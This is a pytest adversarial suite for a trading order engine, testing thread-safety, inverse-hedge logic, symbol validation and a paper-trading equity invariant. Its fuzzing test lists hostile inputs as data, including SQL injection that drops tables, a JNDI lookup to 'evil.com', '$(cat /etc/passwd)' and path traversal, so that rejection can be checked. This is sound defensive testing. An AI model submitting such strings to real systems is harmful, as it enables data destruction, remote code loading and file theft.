# -*- coding: utf-8 -*-
"""
tests/test_phase154_m3_gen2_adversarial.py
=========================================
Adversarial Verification Suite for Milestone 3 (Phase 154, Features F750–F754).
Conducted by teamwork_challenger instance challenger_m3_gen2_2.

Verification Objectives:
1. F754 Concurrency Stress & Determinism:
   - 32 parallel worker threads executing order planning through ExecutionOMSEngine.
   - Verification of zero race conditions, zero deadlocks, zero uncaught exceptions,
     and exact deterministic order plan outputs across all threads given identical inputs.
   - High-contention SQLite WAL database stress with 32 concurrent threads x 5 cycles.
2. OMS Gate 8 Synthetic Beta Inverse Hedge:
   - Verification of synthetic inverse hedge triggers under BEAR_HIGH_VOL and PANIC_CRISIS regimes.
   - Exact symbol resolution: "114800" for KRX (KOSPI/KOSDAQ, -2x) and "PSQ" / "SH" for US (NASDAQ/SP500, -1x).
   - Strict positive weight calculation and bounds enforcement.
3. Symbol Validation & SQL Injection Resilience:
   - 100+ fuzzing payloads encompassing SQL injection, script injection, command injection,
     format strings, null bytes, unicode homoglyphs, whitespace, and type boundary anomalies.
   - Clean rejection to empty string for malicious payloads and proper sanitization for trimmable strings.
4. Paper Trading Daemon Invariant Check:
   - Execution of paper trading daemon dry-run cycle.
   - Verification of the fundamental conservation law: Net Equity <= Gross Equity.
"""

from __future__ import annotations

import concurrent.futures
import json
import math
import os
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Tuple

import numpy as np
import pandas as pd
import pytest

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))
_TRADING_SYS = _PROJECT_ROOT / "trading_system"
if str(_TRADING_SYS) not in sys.path:
    sys.path.insert(0, str(_TRADING_SYS))

from src.execution.oms_engine import ExecutionOMSEngine, _SYMBOL_RE, _is_invalid_or_nonpositive_price
from src.risk.portfolio_allocator import PortfolioAllocator
from src.execution.paper_trading_daemon import PaperTradingDaemon


# ==============================================================================
# Challenge 1: F754 Concurrency Stress & Determinism (32 Parallel Threads)
# ==============================================================================

def test_f754_concurrency_32_threads_exact_determinism():
    """
    Challenge 1A:
    Spawn 32 parallel threads executing generate_order_plan simultaneously
    on a shared ExecutionOMSEngine instance with identical portfolio inputs.
    
    Verifies:
    - 0 race conditions.
    - 0 deadlocks (timeout barrier = 15.0s).
    - 0 uncaught exceptions.
    - 100% deterministic plan outputs across all 32 threads.
    """
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name

    try:
        oms = ExecutionOMSEngine(db_path=db_path)

        top_preds = [
            {"symbol": "005930", "expected_return": 0.045, "close_price": 72000.0, "market": "KOSPI"},
            {"symbol": "000660", "expected_return": 0.038, "close_price": 125000.0, "market": "KOSPI"},
            {"symbol": "035420", "expected_return": 0.025, "close_price": 195000.0, "market": "KOSPI"},
        ]
        port_weights = {
            "005930": 0.040,
            "000660": 0.035,
            "035420": 0.025,
        }
        holdings = {
            "005930": 0.0,
            "000660": 0.0,
            "035420": 0.0,
        }
        prices = {
            "005930": pd.DataFrame({"Close": [72000.0] * 10}),
            "000660": pd.DataFrame({"Close": [125000.0] * 10}),
            "035420": pd.DataFrame({"Close": [195000.0] * 10}),
        }

        results: List[Tuple[int, List[Dict[str, Any]], Optional[Exception]]] = []
        barrier = threading.Barrier(32)

        def worker(thread_idx: int):
            try:
                # Synchronize start across all 32 threads for maximum concurrency contention
                barrier.wait(timeout=10.0)
                plan = oms.generate_order_plan(
                    top_predictions=top_preds,
                    portfolio_weights=port_weights,
                    current_holdings=holdings,
                    prices_dict=prices,
                    total_capital=100_000_000.0,
                    crisis_level="NORMAL",
                    regime_label="BULL_LOW_VOL",
                )
                results.append((thread_idx, plan, None))
            except Exception as exc:
                results.append((thread_idx, [], exc))

        threads = [threading.Thread(target=worker, args=(i,), name=f"Challenger-Worker-{i}") for i in range(32)]
        t_start = time.perf_counter()
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=15.0)
        elapsed = time.perf_counter() - t_start

        # 1. Verification of thread completion
        assert len(results) == 32, f"Expected 32 completed threads, but got {len(results)}"
        
        # 2. Verification of zero exceptions
        exceptions = [res[2] for res in results if res[2] is not None]
        assert len(exceptions) == 0, f"Encountered {len(exceptions)} thread exceptions: {exceptions}"

        # 3. Verification of deterministic order plan outputs
        def extract_order_signature(plan):
            return tuple(
                sorted([
                    (
                        item["symbol"],
                        item["action"],
                        round(float(item["target_weight"]), 4),
                        int(item["quantity"]),
                        round(float(item["target_price"]), 2),
                        round(float(item["target_amount"]), 2),
                        item["execution_strategy"],
                    )
                    for item in plan
                ])
            )

        baseline_sig = extract_order_signature(results[0][1])
        assert len(baseline_sig) == 3, f"Expected 3 orders, got {len(baseline_sig)}"

        for tid, plan, _ in results[1:]:
            sig = extract_order_signature(plan)
            assert sig == baseline_sig, f"Non-deterministic plan detected on Thread #{tid} vs Thread #{results[0][0]}"

        # Print latency telemetry
        print(f"\n[F754 CONCURRENCY STRESS] 32 threads completed deterministically in {elapsed:.4f}s ({elapsed / 32 * 1000:.2f}ms/thread). Zero errors.")

    finally:
        if os.path.exists(db_path):
            try:
                os.remove(db_path)
            except Exception:
                pass


def test_f754_concurrency_32_threads_high_contention_db_stress():
    """
    Challenge 1B:
    High-contention SQLite write stress: 32 parallel threads generating unique order plans
    across 5 consecutive cycles (total 160 multi-order plan batches = 480+ orders written).
    
    Verifies:
    - Zero database lock contention failures (WAL mode + mutex lock).
    - Zero uncaught exceptions under heavy parallel write load.
    - Zero deadlocks.
    - Complete data integrity in SQLite tables.
    """
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name

    try:
        oms = ExecutionOMSEngine(db_path=db_path)
        barrier = threading.Barrier(32)
        errors: List[Exception] = []
        orders_generated = 0
        lock = threading.Lock()

        def worker(thread_idx: int):
            nonlocal orders_generated
            try:
                barrier.wait(timeout=10.0)
                for cycle in range(5):
                    sym1 = f"KRX_{thread_idx:02d}_{cycle:02d}_A"
                    sym2 = f"KRX_{thread_idx:02d}_{cycle:02d}_B"
                    preds = [
                        {"symbol": sym1, "expected_return": 0.05, "close_price": 50000.0, "market": "KOSPI"},
                        {"symbol": sym2, "expected_return": 0.04, "close_price": 25000.0, "market": "KOSPI"},
                    ]
                    weights = {sym1: 0.03, sym2: 0.02}
                    holdings = {sym1: 0.0, sym2: 0.0}
                    prices = {
                        sym1: pd.DataFrame({"Close": [50000.0] * 5}),
                        sym2: pd.DataFrame({"Close": [25000.0] * 5}),
                    }
                    plans = oms.generate_order_plan(
                        top_predictions=preds,
                        portfolio_weights=weights,
                        current_holdings=holdings,
                        prices_dict=prices,
                        total_capital=50_000_000.0,
                        crisis_level="NORMAL",
                    )
                    with lock:
                        orders_generated += len(plans)
            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(32)]
        t_start = time.perf_counter()
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=25.0)
        elapsed = time.perf_counter() - t_start

        assert len(errors) == 0, f"Encountered {len(errors)} database/threading errors: {errors}"
        assert orders_generated == 32 * 5 * 2, f"Expected {32 * 5 * 2} generated orders, got {orders_generated}"

        # Verify DB records
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        count = cur.execute("SELECT COUNT(*) FROM order_plans").fetchone()[0]
        conn.close()
        assert count == orders_generated, f"Expected {orders_generated} rows in order_plans, found {count}"

        print(f"\n[F754 DB CONTENTION] 32 threads x 5 cycles ({orders_generated} orders) written in {elapsed:.4f}s with 0 errors.")

    finally:
        if os.path.exists(db_path):
            try:
                os.remove(db_path)
            except Exception:
                pass


# ==============================================================================
# Challenge 2: OMS Gate 8 Synthetic Beta Inverse Hedge
# ==============================================================================

def test_gate8_synthetic_inverse_hedge_portfolio_allocator_bear_and_crisis():
    """
    Challenge 2A:
    Test PortfolioAllocator.compute_synthetic_inverse_hedge under BEAR_HIGH_VOL and PANIC_CRISIS.
    
    Verifies:
    1. Activation only under Bear / Crisis regimes.
    2. Proper synthetic hedge instrument selection:
       - KRX -> '114800' (KODEX 200 선물인버스2X, -2x)
       - US NASDAQ -> 'PSQ' (ProShares Short QQQ, -1x)
       - US SP500 / other -> 'SH' (ProShares Short S&P500, -1x)
    3. Mathematical positive weight calculation:
       target_hedge_w = (portfolio_beta * invested_equity) / inv_leverage
       net_beta = portfolio_beta * invested_equity - (hedge_w * inv_leverage) -> effectively neutralized.
    4. Regime gating:
       BULL_LOW_VOL / SIDEWAYS -> hedge_required == False, hedge_weight == 0.0.
    """
    # 1. KRX BEAR_HIGH_VOL
    krx_weights = {"005930": 0.12, "000660": 0.08, "035420": 0.05}
    h_krx = PortfolioAllocator.compute_synthetic_inverse_hedge(
        portfolio_weights=krx_weights,
        market="KOSPI",
        regime_label="BEAR_HIGH_VOL",
        cash_ratio=0.10,
    )
    assert h_krx["hedge_required"] is True
    assert h_krx["hedge_symbol"] == "114800"
    assert h_krx["hedge_leverage"] == 2.0
    assert h_krx["hedge_weight"] > 0.0
    assert h_krx["net_portfolio_beta"] < h_krx["portfolio_beta_before"]
    expected_w_krx = (h_krx["portfolio_beta_before"] * (1.0 - 0.10) * sum(krx_weights.values())) / 2.0
    assert math.isclose(h_krx["hedge_weight"], expected_w_krx, abs_tol=1e-5)

    # 2. KRX PANIC_CRISIS
    h_krx_crisis = PortfolioAllocator.compute_synthetic_inverse_hedge(
        portfolio_weights=krx_weights,
        market="KRX",
        regime_label="PANIC_CRISIS",
    )
    assert h_krx_crisis["hedge_required"] is True
    assert h_krx_crisis["hedge_symbol"] == "114800"
    assert h_krx_crisis["hedge_weight"] > 0.0

    # 3. US NASDAQ BEAR_HIGH_VOL
    us_nasdaq_weights = {"AAPL": 0.10, "NVDA": 0.10, "MSFT": 0.08}
    h_nasdaq = PortfolioAllocator.compute_synthetic_inverse_hedge(
        portfolio_weights=us_nasdaq_weights,
        market="NASDAQ",
        regime_label="BEAR_HIGH_VOL",
    )
    assert h_nasdaq["hedge_required"] is True
    assert h_nasdaq["hedge_symbol"] == "PSQ"
    assert h_nasdaq["hedge_leverage"] == 1.0
    assert h_nasdaq["hedge_weight"] > 0.0

    # 4. US SP500 PANIC_CRISIS
    us_sp500_weights = {"JNJ": 0.08, "PG": 0.07, "XOM": 0.05}
    h_sp500 = PortfolioAllocator.compute_synthetic_inverse_hedge(
        portfolio_weights=us_sp500_weights,
        market="SP500",
        regime_label="PANIC_CRISIS",
    )
    assert h_sp500["hedge_required"] is True
    assert h_sp500["hedge_symbol"] == "SH"
    assert h_sp500["hedge_leverage"] == 1.0
    assert h_sp500["hedge_weight"] > 0.0

    # 5. Non-Bear regimes (BULL / SIDEWAYS) must NOT trigger hedge
    h_bull = PortfolioAllocator.compute_synthetic_inverse_hedge(
        portfolio_weights=krx_weights,
        market="KOSPI",
        regime_label="BULL_LOW_VOL",
    )
    assert h_bull["hedge_required"] is False
    assert h_bull["hedge_symbol"] is None
    assert h_bull["hedge_weight"] == 0.0

    # 6. Zero weights or 100% cash
    h_empty = PortfolioAllocator.compute_synthetic_inverse_hedge(
        portfolio_weights={},
        market="KOSPI",
        regime_label="BEAR_HIGH_VOL",
    )
    assert h_empty["hedge_required"] is False

    h_full_cash = PortfolioAllocator.compute_synthetic_inverse_hedge(
        portfolio_weights=krx_weights,
        market="KOSPI",
        regime_label="BEAR_HIGH_VOL",
        cash_ratio=1.0,
    )
    assert h_full_cash["hedge_required"] is True
    assert h_full_cash["hedge_weight"] == 0.0


def test_gate8_synthetic_inverse_hedge_oms_engine_order_generation():
    """
    Challenge 2B:
    Test ExecutionOMSEngine.generate_order_plan Gate 8 hedge order generation.
    
    Verifies:
    1. Under BEAR_HIGH_VOL, KRX portfolio generates synthetic hedge order:
       - symbol: "114800"
       - action: "BUY_HEDGE"
       - status: "HEDGE_ACTIVE"
       - name: "INVERSE_HEDGE_OVERLAY"
       - quantity > 0
    2. Under PANIC_CRISIS, US portfolio generates synthetic hedge order:
       - symbol in ("PSQ", "SH")
       - action: "BUY_HEDGE"
       - status: "HEDGE_ACTIVE"
       - quantity > 0
    """
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name

    try:
        oms = ExecutionOMSEngine(db_path=db_path)

        # 1. KRX BEAR_HIGH_VOL
        krx_preds = [
            {"symbol": "005930", "expected_return": 0.04, "close_price": 70000.0, "market": "KOSPI"},
            {"symbol": "000660", "expected_return": 0.03, "close_price": 120000.0, "market": "KOSPI"},
        ]
        krx_weights = {"005930": 0.15, "000660": 0.10}
        plans_krx = oms.generate_order_plan(
            top_predictions=krx_preds,
            portfolio_weights=krx_weights,
            current_holdings={"005930": 0.0, "000660": 0.0},
            total_capital=100_000_000.0,
            regime_label="BEAR_HIGH_VOL",
            crisis_level="NORMAL",
        )
        hedge_orders_krx = [p for p in plans_krx if p["action"] == "BUY_HEDGE"]
        assert len(hedge_orders_krx) == 1, f"Expected 1 KRX hedge order, got {len(hedge_orders_krx)}"
        h_krx = hedge_orders_krx[0]
        assert h_krx["symbol"] == "114800"
        assert h_krx["status"] == "HEDGE_ACTIVE"
        assert h_krx["target_weight"] > 0.0
        assert h_krx["quantity"] > 0
        assert h_krx["name"] == "INVERSE_HEDGE_OVERLAY"

        # 2. US PANIC_CRISIS (with crisis_level="ELEVATED" so normal BUY aren't wiped by SEVERE gate)
        us_preds = [
            {"symbol": "AAPL", "expected_return": 0.04, "close_price": 180.0, "market": "NASDAQ"},
            {"symbol": "MSFT", "expected_return": 0.03, "close_price": 400.0, "market": "NASDAQ"},
        ]
        us_weights = {"AAPL": 0.15, "MSFT": 0.10}
        plans_us = oms.generate_order_plan(
            top_predictions=us_preds,
            portfolio_weights=us_weights,
            current_holdings={"AAPL": 0.0, "MSFT": 0.0},
            total_capital=100_000_000.0,
            regime_label="PANIC_CRISIS",
            crisis_level="ELEVATED",
        )
        hedge_orders_us = [p for p in plans_us if p["action"] == "BUY_HEDGE"]
        assert len(hedge_orders_us) == 1, f"Expected 1 US hedge order, got {len(hedge_orders_us)}"
        h_us = hedge_orders_us[0]
        assert h_us["symbol"] in ("PSQ", "SH")
        assert h_us["status"] == "HEDGE_ACTIVE"
        assert h_us["target_weight"] > 0.0
        assert h_us["quantity"] > 0

    finally:
        if os.path.exists(db_path):
            try:
                os.remove(db_path)
            except Exception:
                pass


# ==============================================================================
# Challenge 3: Symbol Validation & SQL Injection Resilience (100+ Payloads)
# ==============================================================================

def test_oms_symbol_validation_and_sqli_fuzzing_100_payloads():
    """
    Challenge 3:
    Fuzz ExecutionOMSEngine._validate_symbol with 100+ malformed, malicious,
    SQL injection, script injection, command injection, and unicode payloads.
    
    Verifies:
    1. Zero unhandled exceptions or crashes across all 100+ inputs.
    2. All malicious, dangerous, or malformed strings are cleanly rejected to "" (empty string).
    3. Surrounding whitespace on valid symbols is properly sanitized.
    4. Valid institutional stock symbols (KRX numeric, KRX with .KS/.KQ, US tickers, tickers with dot/dash)
       are correctly validated and preserved intact.
    """
    oms = ExecutionOMSEngine()

    # Construct extensive payload categories (100+ payloads total)
    sqli_payloads = [
        "'; DROP TABLE orders; --",
        "'; DROP TABLE order_plans; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "1; SELECT * FROM users;",
        "UNION SELECT NULL, NULL, NULL--",
        "'; DELETE FROM execution_logs; --",
        "1' WAITFOR DELAY '0:0:5'--",
        "benchmark(10000000,MD5(1))",
        "SLEEP(5)",
        "/* comment */ 005930",
        "005930' OR 'a'='a",
        "005930'; EXEC xp_cmdshell('dir');--",
        "' UNION ALL SELECT @@version, 1, 1--",
        "'; TRUNCATE TABLE order_plans; --",
        "' OR ''='",
        "1' AND 1=(SELECT COUNT(*) FROM order_plans); --",
        "005930' AND 1=0 UNION ALL SELECT NULL--",
        "005930' OR 1=1#",
    ]

    cmd_and_script_payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "& calc.exe",
        "| whoami",
        "`whoami`",
        "; reboot",
        "$(cat /etc/passwd)",
        "\r\nSET-COOKIE: session=hijack",
        "\x00005930",
        "005930\x00",
        "005930\nDROP",
        "005930\r\nDROP",
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "eval('hack')",
        "__import__('os').system('ls')",
        "javascript:void(0)",
        "json:{\"evil\": true}",
    ]

    syntax_and_special_char_payloads = [
        "{'symbol': '005930'}",
        "{005930}",
        "005930:KRX",
        "'005930'",
        '"005930"',
        "005930 000660",
        "AAPL MSFT",
        "  ",
        "\t\t",
        "\n",
        "\r",
        "!!!",
        "$$$",
        "%%%^",
        "***()",
        "005930!",
        "AAPL@US",
        "MSFT#NASDAQ",
        "GOOG$STOCK",
        "AMZN%SHARE",
        "TSLA&RIDE",
        "NVDA*CHIP",
        "META+VR",
        "NFLX=STREAM",
        "~005930",
        "/005930",
        "\\005930",
        "|005930",
        "?005930",
        "#005930",
    ]

    length_and_boundary_payloads = [
        "",                             # 0 length
        "A" * 21,                       # 21 chars (exceeds 20 max)
        "A" * 50,
        "A" * 100,
        "A" * 1000,
        "005930" * 5,
        "AAPL" * 10,
        ".",                            # Starts with dot (not [A-Z0-9])
        "-",                            # Starts with dash
        "_",                            # Starts with underscore
        "^VIX",                         # Starts with caret
        ":",                            # Colon
        ";",                            # Semicolon
    ]

    unicode_and_homoglyph_payloads = [
        "００５９３０",                  # Fullwidth numbers
        "ＡＡＰＬ",                      # Fullwidth letters
        "삼성전자",                      # Korean Hangul syllables
        "카카오",
        "ААРL",                         # Cyrillic A (U+0410) homoglyph
        "ΑΑPL",                         # Greek Alpha (U+0391) homoglyph
        "A\u200bAAPL",                  # Zero-width space
        "AAPL\u200c",                   # Zero-width non-joiner
        "AAPL🚀",                       # Emoji
        "𝔸𝔸ℙ𝕃",                         # Mathematical double-struck
        "\u202eAAPL",                   # Right-to-Left Override (RTLO)
        "AAPL\uFEFF",                   # Zero-width BOM
        "ÄÄPL",                         # Umlaut
        "ÂÂPL",                         # Circumflex
        "ÀÀPL",                         # Grave
        "ÆPL",                          # Ligature
        "ß",                            # Sharp S
    ]

    type_anomaly_payloads = [
        None,
        12345,
        70000.0,
        True,
        False,
        ["005930"],
        ("005930",),
        {"symbol": "005930"},
        {"005930"},
        object(),
    ]

    all_malicious_payloads = (
        sqli_payloads
        + cmd_and_script_payloads
        + syntax_and_special_char_payloads
        + length_and_boundary_payloads
        + unicode_and_homoglyph_payloads
        + type_anomaly_payloads
    )

    # Ensure we test strictly >= 100 payloads
    assert len(all_malicious_payloads) >= 100, f"Expected >= 100 fuzzing payloads, constructed {len(all_malicious_payloads)}"

    tested_count = 0
    clean_rejections = 0

    for payload in all_malicious_payloads:
        tested_count += 1
        try:
            validated = oms._validate_symbol(payload)
            # Must return clean empty string for all malicious/malformed inputs
            assert validated == "", f"Payload {repr(payload)} was NOT cleanly rejected! Returned: {repr(validated)}"
            clean_rejections += 1
        except Exception as e:
            pytest.fail(f"Exception raised while fuzzing payload {repr(payload)}: {e}")

    # Test sanitization of surrounding whitespace on valid symbols
    whitespace_wrapped_payloads = [
        ("  005930  ", "005930"),
        ("\t000660\t", "000660"),
        (" AAPL ", "AAPL"),
        ("005930\r\n", "005930"),
        ("\nMSFT\n", "MSFT"),
    ]
    for raw, expected in whitespace_wrapped_payloads:
        sanitized = oms._validate_symbol(raw)
        assert sanitized == expected, f"Whitespace sanitization failed for {repr(raw)}: expected {expected}, got {sanitized}"

    # Valid symbols must pass without modification
    valid_symbols = [
        "005930",
        "000660",
        "035420",
        "005930.KS",
        "035720.KQ",
        "AAPL",
        "MSFT",
        "GOOGL",
        "BRK.B",
        "BF-B",
        "114800",
        "PSQ",
        "SH",
        "SPY",
        "QQQ",
    ]

    for sym in valid_symbols:
        validated = oms._validate_symbol(sym)
        assert validated == sym, f"Valid symbol {sym} was erroneously rejected or altered: {validated}"

    print(f"\n[SYMBOL FUZZING & SQLI RESILIENCE] {tested_count}/{tested_count} malicious/malformed payloads cleanly rejected (0 exceptions). Surrounding whitespace sanitized. Valid institutional symbols 100% preserved.")


# ==============================================================================
# Challenge 4: Paper Trading Daemon Invariant Check (Net Equity <= Gross Equity)
# ==============================================================================

def test_paper_trading_daemon_net_equity_le_gross_equity_invariant_programmatic():
    """
    Challenge 4A:
    Programmatically instantiate and run PaperTradingDaemon in dry_run mode.
    
    Verifies:
    1. Rebalance cycle completes with status SUCCESS.
    2. Strict preservation of the conservation invariant:
       Net Equity <= Gross Equity at all times.
    3. Transaction costs (STT, exchange fees, Gatheral 3/2-power impact) >= 0.
    4. Net Equity <= Gross Equity strictly holds.
    """
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name

    try:
        daemon = PaperTradingDaemon(
            db_path=db_path,
            initial_capital=100_000_000.0,
            dry_run=True,
        )

        test_allocations = [
            {"symbol": "005930", "target_weight": 0.045, "target_price": 72000.0, "market": "KOSPI"},
            {"symbol": "000660", "target_weight": 0.035, "target_price": 125000.0, "market": "KOSPI"},
            {"symbol": "035420", "target_weight": 0.020, "target_price": 195000.0, "market": "KOSPI"},
            {"symbol": "AAPL", "target_weight": 0.030, "target_price": 180.0, "market": "NASDAQ"},
            {"symbol": "MSFT", "target_weight": 0.025, "target_price": 400.0, "market": "NASDAQ"},
        ]

        summary = daemon.run_cycle(target_input=test_allocations)

        # 1. Conservation invariant
        assert summary["status"] == "SUCCESS"
        assert summary["invariant_net_le_gross"] is True, "invariant_net_le_gross flag reported False"
        assert summary["net_equity"] <= summary["gross_equity"] + 1e-9, (
            f"INVARIANT VIOLATION: Net Equity ({summary['net_equity']}) > Gross Equity ({summary['gross_equity']})"
        )

        # 2. Non-negative friction
        assert summary["total_fees_paid"] >= 0.0, "Negative fees paid"
        assert summary["total_impact_cost"] >= 0.0, "Negative impact cost"

        print(f"\n[PAPER TRADING INVARIANT] Gross Equity: {summary['gross_equity']:,.2f} | Net Equity: {summary['net_equity']:,.2f} | Fees: {summary['total_fees_paid']:,.2f} | Impact: {summary['total_impact_cost']:,.2f} -> Invariant Net <= Gross STRICTLY HOLDS.")

    finally:
        if os.path.exists(db_path):
            try:
                os.remove(db_path)
            except Exception:
                pass


def test_paper_trading_daemon_cli_runner_dry_run():
    """
    Challenge 4B:
    Run the official CLI script: python scripts/run_paper_trading_daemon.py --dry-run --iterations 1.
    
    Verifies:
    1. Process exits cleanly with Exit Code 0.
    2. Output log explicitly confirms '[Invariant Check] Net Equity <= Gross Equity: PASSED'.
    3. Output summary reports 'Invariant Passed : YES'.
    """
    cmd = [sys.executable, "scripts/run_paper_trading_daemon.py", "--dry-run", "--iterations", "1"]
    res = subprocess.run(cmd, cwd=str(_PROJECT_ROOT), capture_output=True, text=True, timeout=30)

    assert res.returncode == 0, f"CLI runner exited with non-zero return code {res.returncode}:\n{res.stderr}"
    combined_output = res.stdout + "\n" + res.stderr

    assert "[Invariant Check] Net Equity <= Gross Equity: PASSED" in combined_output, (
        f"Missing invariant log assertion in output:\n{combined_output}"
    )
    assert "Invariant Passed : YES" in combined_output, (
        f"Missing 'Invariant Passed : YES' in summary:\n{combined_output}"
    )
    assert "Status           : SUCCESS" in combined_output, (
        f"Missing 'Status : SUCCESS' in summary:\n{combined_output}"
    )

    print("\n[PAPER TRADING CLI RUNNER] scripts/run_paper_trading_daemon.py --dry-run --iterations 1: Exit Code 0, Invariant Verified.")
